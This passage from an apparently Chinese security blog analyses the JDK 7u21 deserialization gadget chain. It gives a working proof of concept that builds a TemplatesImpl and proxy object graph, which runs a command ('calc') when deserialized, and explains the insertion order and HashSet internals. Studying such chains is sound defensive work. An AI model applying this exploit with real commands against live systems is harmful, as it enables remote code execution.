</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">//注意先放入proxy
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#e06c75">hashSet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">add</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ByteArrayOutputStream</span> <span style="color:#e06c75">byteArrayOutputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ByteArrayOutputStream</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ObjectOutputStream</span> <span style="color:#e06c75">objectOutputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ObjectOutputStream</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">byteArrayOutputStream</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">objectOutputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeObject</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">hashSet</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">bytes1</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">byteArrayOutputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">toByteArray</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ByteArrayInputStream</span> <span style="color:#e06c75">byteArrayInputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ByteArrayInputStream</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">bytes1</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ObjectInputStream</span> <span style="color:#e06c75">objectInputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ObjectInputStream</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">byteArrayInputStream</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">objectInputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">readObject</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span><span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p>这里一定要注意add的顺序，先 add(proxy)，再 add(templatesImpl)，不然在序列化的过程中就触发了 TemplatesImpl.newTransformer() 方法，注意 add 的顺序另外一个原因是为了确保反序列化时，调用 hashMap.put 依次存入 <code>templatesImpl</code>、<code>proxy</code></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#e06c75">V</span> <span style="color:#61afef;font-weight:bold">put</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">K</span> <span style="color:#e06c75">key</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">V</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">..</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">int</span> <span style="color:#e06c75">hash</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">hash</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">key</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">...</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">addEntry</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">hash</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">key</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">i</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">return</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">addEntry</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">int</span> <span style="color:#e06c75">hash</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">K</span> <span style="color:#e06c75">key</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">V</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">,</span> <span style="color:#e5c07b">int</span> <span style="color:#e06c75">bucketIndex</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">...</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">createEntry</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">hash</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">key</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">bucketIndex</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">createEntry</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">int</span> <span style="color:#e06c75">hash</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">K</span> <span style="color:#e06c75">key</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">V</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">,</span> <span style="color:#e5c07b">int</span> <span style="color:#e06c75">bucketIndex</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Entry</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">K</span><span style="color:#56b6c2">,</span><span style="color:#e06c75">V</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">e</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">table</span><span style="color:#56b6c2">[</span><span style="color:#e06c75">bucketIndex</span><span style="color:#56b6c2">];</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">table</span><span style="color:#56b6c2">[</span><span style="color:#e06c75">bucketIndex</span><span style="color:#56b6c2">]</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">Entry</span><span style="color:#56b6c2">&lt;&gt;(</span><span style="color:#e06c75">hash</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">key</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">e</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">size</span><span style="color:#56b6c2">++;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p>在调用 addEntry(hash, key, value, i) 创建<code>Entry</code>对象时，由于 proxy.hashCode ==  templatesImpl.hashCode()，即 hash(proxy) == hash(templatesImpl)，它们的hash值相同。因此 templatesImpl 所创建的<code>Entry</code>对象会取代原先 proxy 创建的<code>Entry</code>对象在 table 中的位置，然后将其 next属性指向 proxy 创建的<code>Entry</code>对象，相当于<code>templatesImpl -&gt; proxy</code></p>
<p>在反序列化执行时，hashMap.put 的顺序也是<code>hashMap.put(templatesImpl) -&gt; hashMap.put(proxy)</code></p>
<p>一箭双雕~</p>
<h3 id="linkedhastset版本的poc">LinkedHastSet版本的POC</h3>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#c678dd">public</span> <span style="color:#c678dd">class</span> <span style="color:#e5c07b">jdk7u21Chain</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#c678dd">class</span> <span style="color:#e5c07b">test</span><span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">main</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">String</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">args</span><span style="color:#56b6c2">)</span> <span style="color:#c678dd">throws</span> <span style="color:#e06c75">NoSuchFieldException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">IOException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">IllegalAccessException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">NotFoundException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">CannotCompileException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">ClassNotFoundException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">NoSuchMethodException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">InvocationTargetException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">InstantiationException</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ClassPool</span> <span style="color:#e06c75">pool</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">ClassPool</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDefault</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">CtClass</span> <span style="color:#e06c75">cc</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pool</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">get</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">test</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">());</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">String</span> <span style="color:#e06c75">cmd</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;java.lang.Runtime.getRuntime().exec(\&#34;calc\&#34;);&#34;</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">cc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">makeClassInitializer</span><span style="color:#56b6c2">().</span><span style="color:#e06c75">insertBefore</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">cmd</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">cc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setSuperclass</span><span style="color:#56b6c2">((</span><span style="color:#e06c75">pool</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">get</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">AbstractTranslet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">())));</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">TemplatesImpl</span> <span style="color:#e06c75">templatesImpl</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">TemplatesImpl</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Class</span> <span style="color:#e06c75">tc</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getClass</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Field</span> <span style="color:#e06c75">nameField</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">tc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredField</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;_name&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">nameField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">nameField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">,</span><span style="color:#98c379">&#34;a&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">//由于getTransletInstance中_name=null会retrun null，所以利用反射，将_name赋值
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Field</span> <span style="color:#e06c75">bytecodesField</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">tc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredField</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;_bytecodes&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">bytecodesField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">codes</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">cc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">toBytecode</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[][]</span> <span style="color:#e06c75">bytes</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[][]{</span><span style="color:#e06c75">codes</span><span style="color:#56b6c2">};</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">bytecodesField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">,</span><span style="color:#e06c75">bytes</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">//同理defineTransletClasses中_bytecodes == null会抛出异常，所以将其赋值
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Field</span> <span style="color:#e06c75">tfactoryField</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">tc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredField</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;_tfactory&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">tfactoryField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">tfactoryField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">,</span><span style="color:#c678dd">new</span> <span style="color:#e06c75">TransformerFactoryImpl</span><span style="color:#56b6c2">());</span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">//本意是为了在defineTransletClasses中，避免_tfactory值为null，导致_tfactory.getExternalExtensionsMap()错误
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#7f848e">//但实际上并不影响代码执行
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Class</span><span style="color:#56b6c2">&lt;?&gt;</span> <span style="color:#e06c75">aClass</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">forName</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Constructor</span><span style="color:#56b6c2">&lt;?&gt;</span> <span style="color:#e06c75">annotationHandlerInvocationHandlerConstructor</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">aClass</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredConstructor</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Map</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">annotationHandlerInvocationHandlerConstructor</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">HashMap</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">Object</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">hashMap</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">HashMap</span><span style="color:#56b6c2">&lt;&gt;();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">hashMap</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">put</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;f5a5a608&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;Override&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">//&#34;f5a5a608&#34;.hashCode() == 0
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#e06c75">InvocationHandler</span> <span style="color:#e06c75">annotationHandlerInvocationHandler</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">InvocationHandler</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">annotationHandlerInvocationHandlerConstructor</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">newInstance</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Templates</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">hashMap</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Templates</span> <span style="color:#e06c75">proxy</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">Templates</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">Proxy</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">newProxyInstance</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">ClassLoader</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getSystemClassLoader</span><span style="color:#56b6c2">(),</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">Class</span><span style="color:#56b6c2">[]{</span><span style="color:#e06c75">Templates</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">},</span> <span style="color:#e06c75">annotationHandlerInvocationHandler</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span><span style="color:#7f848e">//        proxy.equals(templatesImpl);
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>
</span></span><span style="display:flex;"><span><span style="color:#7f848e">//        HashMap&lt;Object, Object&gt; hashMap1 = new HashMap&lt;&gt;();
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">//        hashMap1.put(templatesImpl,&#34;1&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">//        hashMap1.put(proxy, &#34;1&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">HashSet</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">Object</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">set</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">LinkedHashSet</span><span style="color:#56b6c2">&lt;&gt;();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">set</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">add</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">set</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">add</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">proxy</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">hashMap</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">put</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;f5a5a608&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ByteArrayOutputStream</span> <span style="color:#e06c75">byteArrayOutputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ByteArrayOutputStream</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ObjectOutputStream</span> <span style="color:#e06c75">objectOutputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ObjectOutputStream</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">byteArrayOutputStream</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">objectOutputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeObject</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">set</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">bytes1</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">byteArrayOutputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">toByteArray</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ByteArrayInputStream</span> <span style="color:#e06c75">byteArrayInputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ByteArrayInputStream</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">bytes1</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ObjectInputStream</span> <span style="color:#e06c75">objectInputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ObjectInputStream</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">byteArrayInputStream</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">objectInputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">readObject</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span><span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p>这个版本的<code>POC</code>和上面自己写的<code>POC</code>主要区别就在于<code>LinkedHashSet</code>的使用上，<code>LinkedHashSet</code>继承自<code>HashSet</code></p>
<p>可以看一下<code>HashSet</code>的<code>readObject</code>方法</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#c678dd">private</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">readObject</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">java</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">io</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">ObjectInputStream</span> <span style="color:#e06c75">s</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">throws</span> <span style="color:#e06c75">java</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">io</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">IOException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">ClassNotFoundException</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">// Read in any hidden serialization magic
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#e06c75">s</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">defaultReadObject</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">// Read in HashMap capacity and load factor and create backing HashMap
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#e5c07b">int</span> <span style="color:#e06c75">capacity</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">s</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">readInt</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">float</span> <span style="color:#e06c75">loadFactor</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">s</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">readFloat</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">map</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">(((</span><span style="color:#e06c75">HashSet</span><span style="color:#56b6c2">)</span><span style="color:#c678dd">this</span><span style="color:#56b6c2">)</span> <span style="color:#c678dd">instanceof</span> <span style="color:#e06c75">LinkedHashSet</span> <span style="color:#56b6c2">?</span>
</span></span><span style="display:flex;"><span>               <span style="color:#c678dd">new</span> <span style="color:#e06c75">LinkedHashMap</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">E</span><span style="color:#56b6c2">,</span><span style="color:#e06c75">Object</span><span style="color:#56b6c2">&gt;(</span><span style="color:#e06c75">capacity</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">loadFactor</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">:</span>
</span></span><span style="display:flex;"><span>               <span style="color:#c678dd">new</span> <span style="color:#e06c75">HashMap</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">E</span><span style="color:#56b6c2">,</span><span style="color:#e06c75">Object</span><span style="color:#56b6c2">&gt;(</span><span style="color:#e06c75">capacity</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">loadFactor</span><span style="color:#56b6c2">));</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">// Read in size
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#e5c07b">int</span> <span style="color:#e06c75">size</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">s</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">readInt</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">// Read in all elements in the proper order.
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#c678dd">for</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">int</span> <span style="color:#e06c75">i</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">;</span> <span style="color:#e06c75">i</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">size</span><span style="color:#56b6c2">;</span> <span style="color:#e06c75">i</span><span style="color:#56b6c2">++)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">E</span> <span style="color:#e06c75">e</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">E</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">s</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">readObject</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">map</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">put</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">e</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">PRESENT</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p>如果为<code>LinkedHashSet</code>，<code>map</code>就等于<code>LinkedHashMap</code>。而<code>LinkedHashMap</code>也继承自<code>HashMap</code></p>
